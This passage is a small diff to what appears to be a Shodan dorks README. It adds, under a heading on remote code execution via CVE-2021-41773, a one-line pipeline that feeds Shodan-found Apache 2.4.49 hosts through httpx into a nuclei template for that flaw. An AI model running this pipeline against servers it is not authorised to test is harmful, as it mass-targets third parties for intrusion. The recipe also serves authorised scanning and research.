@@ -159,6 +159,7 @@ country:pe port:445
 ## Exploit Web RCE CVE-2021-41773
 ```sh
 shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
+cat url.txt | httpx | nuclei -t nuclei-templates/cves/2021/CVE-2021-41773.yaml
 ```
 ![16](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ce43c1a0-047e-45c3-8a2c-eb18efce51f1)
 
